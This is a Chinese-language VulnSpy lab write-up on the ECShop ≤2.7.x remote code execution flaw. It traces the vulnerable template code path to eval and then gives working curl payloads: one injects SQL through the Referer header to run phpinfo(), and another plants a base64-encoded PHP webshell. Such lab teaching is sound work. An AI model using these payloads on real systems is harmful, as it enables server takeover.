<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="author" content="Ambulong">
<meta name="description" content="2018年9月1日，阿里云态势感知发布预警，近日利用ECShop全系列版本的远程代码执行漏洞进行批量化攻击量呈上升趋势，该漏洞可直接导致网站服务器沦陷，黑客可通过WEB攻击直接获得服务器权限，利用简单且危害较大。">
<meta name="keywords" content="ecshop,rce,exploit,payload,ec,2.7.3,2.7,2.6,漏洞,攻击,远程代码执行,代码执行,高危,利用,复现,演示,exp,exploit,security,practict,在线靶场,黑客技术,网络安全,信息安全,漏洞测试,CTF在线,渗透测试,在线练习,演练,实验,pentest,online">
<title>ECShop &lt;= 2.7.x 全系列版本远程代码执行高危漏洞利用 | VULNSPY</title>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
<script src="/js/jquery-1.11.3.min.js"></script>
<script src="/js/jquery-migrate-1.2.1.min.js"></script>
<link href="/css/bootstrap.min.css" rel="stylesheet">
<link href="/css/ie10-viewport-bug-workaround.css" rel="stylesheet">
<!--[if lt IE 9]><script src="/js/ie8-responsive-file-warning.js"></script><![endif]-->
<script src="/js/ie-emulation-modes-warning.js"></script>
<!--[if lt IE 9]>
<script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
<![endif]-->
<script src="/js/bootstrap.min.js"></script>
<!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
<script src="/js/ie10-viewport-bug-workaround.js"></script>
<link rel="stylesheet" href="/css/custom.css" />
<link rel="stylesheet" href="/css/prism.css" />
<script src="/js/functions.js"></script>
<script src="/js/custom.js"></script>
<script>
function GetQueryString(name)
{
     var reg = new RegExp("(^|&)"+ name +"=([^&]*)(&|$)");
     var r = window.location.search.substr(1).match(reg);
     if(r!=null)return  unescape(r[2]); return null;
}
var lang="en";
var la=(navigator.language) ? navigator.language.toLowerCase() : navigator.userLanguage.toLowerCase();
if(la=='zh-cn' || la=='zh-tw' || la=='zh-hk'){
	lang="cn";
}
</script>
<!--[if lt IE 9]>
	<script src="http://css3-mediaqueries-js.googlecode.com/svn/trunk/css3-mediaqueries.js"></script>
<![endif]-->
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-108901411-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-108901411-2');
</script>
</head>
<body>
<div class="view-header" style="z-index: 999;">
    <ul>
    	<li><a href="/"><h1><img style="width:1.5em;height: auto;margin-top: -0.3em;" src="/images/owl2.png" /></h1></a></li>
        <li ><a href="/">VULNSPY</a></li>
        <li><a href="https://blog.vulnspy.com/">BlOG</a></li>
        <div class="pull-right">
            <li><a target="_blank" href="/images/qqun.jpeg">QQ 群</a></li>
            <li><a target="_blank" href="https://t.me/vulnspy">TELEGRAM GROUP</a></li>
            <li><a target="_blank" href="https://www.youtube.com/channel/UCnqjUDkrZ0OFwZvxxiC47gw">YOUTUBE CHANNEL</a></li>
        </div>
    </ul>
</div>
<style>
.main{
	
	margin: 0 auto;
	margin-top: 7em;
	max-width: 90em;
	width: 95%;
}
.lab{
	float:left;
	width: 77%;
}
.lab h1{
	padding: 0;
	font-size: 230%;
	margin: 20px 0;
	line-height: 1.5em;
}

.lab .demo{
	font-size: 115%;
	line-height: 2em;
	border: 1px solid #ccc;
	background: #2C3844;
	margin: 1.8em 0 1em 0;
}
.lab .demo .demo-btn{
	text-align: center;
	font-size: 150%;
	margin: 0.3em 0;
	color: #FFF;
}
.lab .demo .demo-btn a{
	background: transparent;
	padding: 1em;
	font-size: 100%;
	display: block;
	
}
.lab .demo .demo-link{
	background: rgba(0,0,0,.25);
}
.lab .demo a{
	font-size: 50%;
	text-transform: uppercase;
	padding: 0 0.5em;
	color: #FFF;
}
.lab .content{
	font-size: 130%;
	line-height: 1.5em;
}
.lab .content p{
	margin: 1em 0;
	word-wrap: break-word;
}
.lab .content img{
	max-width: 100%;
	margin: 1em 0;
}
.sidebar{
	width: 23%;
	float: left;
	padding-left: 2em;
	margin-top: 20px;
}
.sidebar .sth-btn {
	width: 100%;
	margin-left: 1em;
}
#sth {
	display: block;
	text-align: center;
	text-transform: uppercase;
	padding: 0.8em 1em;
	font-size:123%;
	border: none;
	border-radius: 0;
	background: #337ab7;
	color: #FFF;
	font-weight: bold;
}
#demo-notice {
	width: 100%;
	margin: 0.8em 0;
	font-size: 90%;
	text-align: center;
	color: #777;
	word-break:break-all;
}
.sidebar ul{
	margin: 2em 0;
	padding: 0;
}
.sidebar ul ul{
	margin: 0;
	margin-left: 1em;
}
.sidebar li{
	margin: 0 0 0.5em 0;
	font-size: 110%;
	list-style: none;
	color: #767676;
	border-left: solid 0.1em #FFF;
	padding-left: 1em;
	margin-left: 1em;
	cursor: pointer;
}
.sidebar li.selected{
	color: #2C3844;
	border-left: solid 0.1em #2C3844;
}
.sidebar li:hover{
	color: #2C3844;
	border-left: solid 0.1em #2C3844;
}
</style>
<div class="main">
	<div class="lab">
		<h1>ECShop &lt;= 2.7.x 全系列版本远程代码执行高危漏洞利用</h1>
		<hr/>
		<div class="content"><p><img src="/images/cn-ecshop-2.7.x-rce-exploit/default.png" alt="" /></p>
<blockquote>
<p>2018年9月1日，阿里云态势感知发布预警，近日利用ECShop全系列版本的远程代码执行漏洞进行批量化攻击量呈上升趋势，该漏洞可直接导致网站服务器沦陷，黑客可通过WEB攻击直接获得服务器权限，利用简单且危害较大。因此，阿里云安全专家提醒ECShop系统用户及时进行修复。 —— <a href="https://xz.aliyun.com/t/2689">ECShop全系列版本远程代码执行高危漏洞分析</a></p>
</blockquote>
<p>本文我们将使用 VulnSpy 的<a href="https://github.com/vulnspy/ECShop_2.7.3_UTF8_installed">在线 ECSHOP 环境</a>对漏洞进行复现和利用演示。</p>
<p><strong>点击右上方 <code>START TO HACK</code> 按钮创建在线实验环境</strong></p>
<hr />
<h3>漏洞分析</h3>
<p><em>漏洞分析部分转载自：<a href="https://mp.weixin.qq.com/s/fXw5VVXQsxv1N-lgWTIHzA">预警| ECShop全系列版本远程代码执行高危漏洞 阿里云WAF已可防御</a></em></p>
<p>该漏洞产生的根本原因在于ECShop系统的user.php文件中，display函数的模板变量可控，导致注入，配合注入可达到远程代码执行的效果。使得攻击者无需登录等操作，直接可以获得服务器的权限。</p>
<p>首先从user.php文件入手，代码中可以看到，系统读取HTTP_REFERER传递过来的内容赋值给$back_act变量。接着以$back_act的值为参数，调用assign方法。</p>
<p>文件：/user.php</p>
<pre><code class="language-php">/* 用户登录界面 */
elseif ($action == 'login')
{
    if (empty($back_act))
    {
        if (empty($back_act) &amp;&amp; isset($GLOBALS['_SERVER']['HTTP_REFERER']))
        {
            $back_act = strpos($GLOBALS['_SERVER']['HTTP_REFERER'], 'user.php') ? './index.php' : $GLOBALS['_SERVER']['HTTP_REFERER'];
        }
        else
        {
            $back_act = 'user.php';
        }

    }

    $captcha = intval($_CFG['captcha']);
    if (($captcha &amp; CAPTCHA_LOGIN) &amp;&amp; (!($captcha &amp; CAPTCHA_LOGIN_FAIL) || (($captcha &amp; CAPTCHA_LOGIN_FAIL) &amp;&amp; $_SESSION['login_fail'] &gt; 2)) &amp;&amp; gd_version() &gt; 0)
    {
        $GLOBALS['smarty']-&gt;assign('enabled_captcha', 1);
        $GLOBALS['smarty']-&gt;assign('rand', mt_rand());
    }

    $smarty-&gt;assign('back_act', $back_act);
    $smarty-&gt;display('user_passport.dwt');
}</code></pre>
<p>assign方法的作用是把可控变量传递给模版函数，紧接着再通过display方法展示到页面上。</p>
<p>文件：/includes/cls_template.php</p>
<pre><code class="language-php">    /**
     * 注册变量
     *
     * @access  public
     * @param   mix      $tpl_var
     * @param   mix      $value
     *
     * @return  void
     */
    function assign($tpl_var, $value = '')
    {
        if (is_array($tpl_var))
        {
            foreach ($tpl_var AS $key =&gt; $val)
            {
                if ($key != '')
                {
                    $this-&gt;_var[$key] = $val;
                }
            }
        }
        else
        {
            if ($tpl_var != '')
            {
                $this-&gt;_var[$tpl_var] = $value;
            }
        }
    }

    /**
     * 显示页面函数
     *
     * @access  public
     * @param   string      $filename
     * @param   sting      $cache_id
     *
     * @return  void
     */
    function display($filename, $cache_id = '')
    {
        $this-&gt;_seterror++;
        error_reporting(E_ALL ^ E_NOTICE);

        $this-&gt;_checkfile = false;
        $out = $this-&gt;fetch($filename, $cache_id);

        if (strpos($out, $this-&gt;_echash) !== false)
        {
            $k = explode($this-&gt;_echash, $out);
            foreach ($k AS $key =&gt; $val)
            {
                if (($key % 2) == 1)
                {
                    $k[$key] = $this-&gt;insert_mod($val);
                }
            }
            $out = implode('', $k);
        }
        error_reporting($this-&gt;_errorlevel);
        $this-&gt;_seterror--;

        echo $out;
    }</code></pre>
<p>接下来跟进display内部的insert_mod方法。</p>
<p>文件：/includes/cls_template.php</p>
<pre><code class="language-php">    function insert_mod($name) // 处理动态内容
    {
        list($fun, $para) = explode('|', $name);
        $para = unserialize($para);
        $fun = 'insert_' . $fun;

        return $fun($para);
    }</code></pre>
<p><code>insert_mod</code>方法返回了一个动态函数调用，该函数名和参数均可控，根据攻击者的利用方法，我们可以得知调用的函数名为<code>insert_ads</code>，接下来跟进这一方法。</p>
<p>文件：/includes/lib_insert.php</p>
<pre><code class="language-php">/**
 * 调用指定的广告位的广告
 *
 * @access  public
 * @param   integer $id     广告位ID
 * @param   integer $num    广告数量
 * @return  string
 */
function insert_ads($arr)
{
    static $static_res = NULL;

    $time = gmtime();
    if (!empty($arr['num']) &amp;&amp; $arr['num'] != 1)
    {
        $sql  = 'SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, ' .
                    'p.ad_height, p.position_style, RAND() AS rnd ' .
                'FROM ' . $GLOBALS['ecs']-&gt;table('ad') . ' AS a '.
                'LEFT JOIN ' . $GLOBALS['ecs']-&gt;table('ad_position') . ' AS p ON a.position_id = p.position_id ' .
                "WHERE enabled = 1 AND start_time &lt;= '" . $time . "' AND end_time &gt;= '" . $time . "' ".
                    "AND a.position_id = '" . $arr['id'] . "' " .
                'ORDER BY rnd LIMIT ' . $arr['num'];
        $res = $GLOBALS['db']-&gt;GetAll($sql);
    }
    ...//ignore
    $position_style = 'str:' . $position_style;

    $need_cache = $GLOBALS['smarty']-&gt;caching;
    $GLOBALS['smarty']-&gt;caching = false;

    $GLOBALS['smarty']-&gt;assign('ads', $ads);
    $val = $GLOBALS['smarty']-&gt;fetch($position_style);

    $GLOBALS['smarty']-&gt;caching = $need_cache;

    return $val;
}</code></pre>
<p>不难发现，$arr['id']和$arr['num']这两个变量，都是外部可控的输入点，在构造攻击向量的过程中执行的SQL语句如下。</p>
<p><img src="/images/cn-ecshop-2.7.x-rce-exploit/644.png" alt="" /></p>
<p><img src="/images/cn-ecshop-2.7.x-rce-exploit/645.png" alt="" /></p>
<p>接着，程序调用了fetch方法，参数由$row['position_style']变量赋值，这一变量同样为外部可控输入点。</p>
<p>文件：/includes/lib_insert.php</p>
<pre><code class="language-php">    $position_style = 'str:' . $position_style;

    $need_cache = $GLOBALS['smarty']-&gt;caching;
    $GLOBALS['smarty']-&gt;caching = false;

    $GLOBALS['smarty']-&gt;assign('ads', $ads);
    $val = $GLOBALS['smarty']-&gt;fetch($position_style);

    $GLOBALS['smarty']-&gt;caching = $need_cache;

    return $val;</code></pre>
<p>这里fetch函数调用了危险函数，这就是最终触发漏洞的点。但是参数在传递之前要经过<code>fetch_str</code>方法的处理。</p>
<p>文件：/includes/cls_template.php</p>
<pre><code class="language-php">function fetch($filename, $cache_id = '')
    {
        if (!$this-&gt;_seterror)
        {
            error_reporting(E_ALL ^ E_NOTICE);
        }
        $this-&gt;_seterror++;

        if (strncmp($filename,'str:', 4) == 0)
        {
            $out = $this-&gt;_eval($this-&gt;fetch_str(substr($filename, 4))); //漏洞点
        }
        ...//ignore
   }</code></pre>
<p>最终输入点依次经过fetch_str、select、get_val，最终传入make_var方法。</p>
<p>文件：/includes/cls_template.php</p>
<pre><code class="language-php">    function make_var($val)
    {
        if (strrpos($val, '.') === false)
        {
            if (isset($this-&gt;_var[$val]) &amp;&amp; isset($this-&gt;_patchstack[$val]))
            {
                $val = $this-&gt;_patchstack[$val];
            }
            $p = '$this-&gt;_var[\'' . $val . '\']';
        }
        else
        {
            $t = explode('.', $val);
            $_var_name = array_shift($t);
            if (isset($this-&gt;_var[$_var_name]) &amp;&amp; isset($this-&gt;_patchstack[$_var_name]))
            {
                $_var_name = $this-&gt;_patchstack[$_var_name];
            }
            if ($_var_name == 'smarty')
            {
                 $p = $this-&gt;_compile_smarty_ref($t);
            }
            else
            {
                $p = '$this-&gt;_var[\'' . $_var_name . '\']';
            }
            foreach ($t AS $val)
            {
                $p.= '[\'' . $val . '\']';
            }
        }

        return $p;
    }</code></pre>
<p>最终传递到eval的字符串为:</p>
<p><img src="/images/cn-ecshop-2.7.x-rce-exploit/649.png" alt="" /></p>
<p>到此，漏洞原理分析完成，攻击者的恶意代码执行成功。</p>
<hr />
<h3>漏洞利用演示</h3>
<p><strong>1.  点击右上方 <code>START TO HACK</code> 按钮创建 ECShop实验环境</strong></p>
<p><img src="/images/cn-ecshop-2.7.x-rce-exploit/exp1.1.png" alt="" /></p>
<p><strong>2. 创建完成后打开 ECSHOP 实验地址</strong></p>
<p><img src="/images/cn-ecshop-2.7.x-rce-exploit/exp2.1.png" alt="" /></p>
<p><strong>3. 发送 Payload 执行 phpinfo();</strong></p>
<p><em>将***.vsplate.me换成您的实验地址</em></p>
<p>在终端中执行：</p>
<p><code>curl http://***.vsplate.me/user.php -d 'action=login&amp;vulnspy=phpinfo();exit;' -H 'Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:3:{s:2:"id";s:3:"'"'"'/*";s:3:"num";s:201:"*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b2476756c6e737079275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262646e5673626e4e77655630704f773d3d2729293b2f2f7d7d,0--";s:4:"name";s:3:"ads";}554fcae493e564ee0dc75bdf2ebf94ca'</code></p>
<p><img src="/images/cn-ecshop-2.7.x-rce-exploit/exp3.1.png" alt="" /></p>
<p><strong>4. 发送 Paylod 写入 webshell</strong></p>
<p>在终端中执行：</p>
<p><code>curl http://***.vsplate.me/user.php -d 'action=login&amp;vulnspy=eval(base64_decode($_POST[d]));exit;&amp;d=ZmlsZV9wdXRfY29udGVudHMoJ3Z1bG5zcHkucGhwJywnPD9waHAgZXZhbCgkX1JFUVVFU1RbdnVsbnNweV0pOz8%2BJyk7' -H 'Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:3:{s:2:"id";s:3:"'"'"'/*";s:3:"num";s:201:"*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b2476756c6e737079275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262646e5673626e4e77655630704f773d3d2729293b2f2f7d7d,0--";s:4:"name";s:3:"ads";}554fcae493e564ee0dc75bdf2ebf94ca'</code></p>
<pre><code class="language-bash">vulnspy@vsplate:~$ curl http://***.vsplate.me/user.php \
-d 'action=login&amp;vulnspy=eval(base64_decode($_POST[d]));exit;&amp;d=ZmlsZV9wdXRfY29udGVudHMoJ3Z1bG5zcHkucGhwJywnPD9waHAgZXZhbCgkX1JFUVVFU1RbdnVsbnNweV0pOz8%2BJyk7' \
-H 'Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:3:{s:2:"id";s:3:"'"'"'/*";s:3:"num";s:201:"*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b2476756c6e737079275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262646e5673626e4e77655630704f773d3d2729293b2f2f7d7d,0--";s:4:"name";s:3:"ads";}554fcae493e564ee0dc75bdf2ebf94ca'
{$</code></pre>
<p><strong>5. 成功获取webshell</strong></p>
<p>执行成功后会自动生成 <code>http://***.vsplate.me/vulnspy.php</code> 文件，密码为 <code>vulnspy</code>。</p>
<p>访问：<code>http://***.vsplate.me/vulnspy.php?vulnspy=phpinfo();</code></p>
<p><img src="/images/cn-ecshop-2.7.x-rce-exploit/5.1.png" alt="" /></p>
<h3>参考</h3>
<ul>
<li><a href="https://xz.aliyun.com/t/2689">ECShop全系列版本远程代码执行高危漏洞分析</a></li>
<li><a href="https://mp.weixin.qq.com/s/fXw5VVXQsxv1N-lgWTIHzA">预警| ECShop全系列版本远程代码执行高危漏洞 阿里云WAF已可防御</a></li>
</ul></div>
	</div>
	<div class="sidebar">
		<div class="sth-btn">
			<a id="sth" target="_blank" href="https://www.vsplate.com/?github=vulnspy/ECShop_2.7.3_UTF8_installed&amp;autogo=1">start to hack</a>
			<p id="demo-notice">Click the button and start the playing.</p>
		</div>
		<ul>
			<li href="#" class="nlink selected"># TOP</li>
		</ul>
	</div>
</div>
<script>
if(lang == 'cn'){
	$("#demo-notice").html("点击上方按钮开启实验.");
}
$(document).ready(function(){

$.extend({
	genMenu: function() {
		var html = '';
		var prevH = 'h0';
		var toClose = 0;
		$(".content").children("h1,h2,h3,h4,h5").each(function(i,e){
			var tagName = $(e)[0].tagName.toLowerCase();
			//var menuName = 'M-'+window.btoa($(e).text());
			var menuName = 'M-'+randomString(32);//+'-'+$(e).text().replace(/\ +/g,"-");
			$(e).attr('id',menuName);
			if(tagName > prevH){
				html = html+'<ul>';
				html = html+'<li class="menu-item nlink" href="#'+$.escapeHtml(menuName)+'">'+$.escapeHtml($(e).text())+'</li>';
				toClose = toClose + 1;
			}else if(tagName == prevH){
				html = html+'<li class="menu-item nlink" href="#'+$.escapeHtml(menuName)+'">'+$.escapeHtml($(e).text())+'</li>';
			}else if(tagName < prevH){
				html = html+'</ul>';
				html = html+'<li class="menu-item nlink" href="#'+$.escapeHtml(menuName)+'">'+$.escapeHtml($(e).text())+'</li>';
				toClose = toClose - 1;
			}
			prevH = tagName;
		});
		while(toClose > 0){
			html = html+'</ul>';
			toClose = toClose - 1;
		}
		$(".sidebar ul").remove();
		$(".sidebar").append(html);
		$(".sidebar ul:first").prepend('<li class="menu-item nlink selected" href="#"># TOP</li>');
		return html;
	}
});
$.extend({
	selectMenu: function() {
		var mintoTop = 20;
		var menu = [];
		$("li.menu-item").each(function(i,e){
			id = $(e);
			if(id && id != '#'){
				menu.push(id);
			}
		});
		for(var i=menu.length;i>0;i--){
			mid = menu[i-1].attr('href');
			var toTop = $(mid).offset().top-$(document).scrollTop();
			if(toTop <= mintoTop){
				$("li.menu-item").removeClass('selected');
				menu[i-1].addClass('selected');
				break;
			}
		}
		return mid;
	}
});
$.extend({
	fixSidebar: function() {
		var sidebarTop = $(".sidebar").offset().top-$(document).scrollTop();
		if($(document).scrollTop() < 120){
			$(".sidebar").css("margin-top", "20px");
		}else if(sidebarTop < 20){
			$(".sidebar").css("margin-top", ($(document).scrollTop()-80)+"px");
		}else if(sidebarTop > 20 && $(document).scrollTop() > 120){
			$(".sidebar").css("margin-top", ($(document).scrollTop()-80)+"px");
		}
	}
});
$.genMenu();
$(window).scroll(function(){
	$.fixSidebar();
	$.selectMenu();
});

});
</script>
<div style="float:left;width:100%;text-align:center;margin-top:5em;background: #000;color: #FFF;">
	<div style="margin:0 auto;width:95%;max-width:90em;padding:1em 0;">All rights reserved. &copy; 2018 VULNSPY</div>
</div>
<script>
$(function () {
	$("pre code").closest("pre").addClass("line-numbers ");
});
</script>
<script src="/js/prism.js"></script>
</body>
</html>
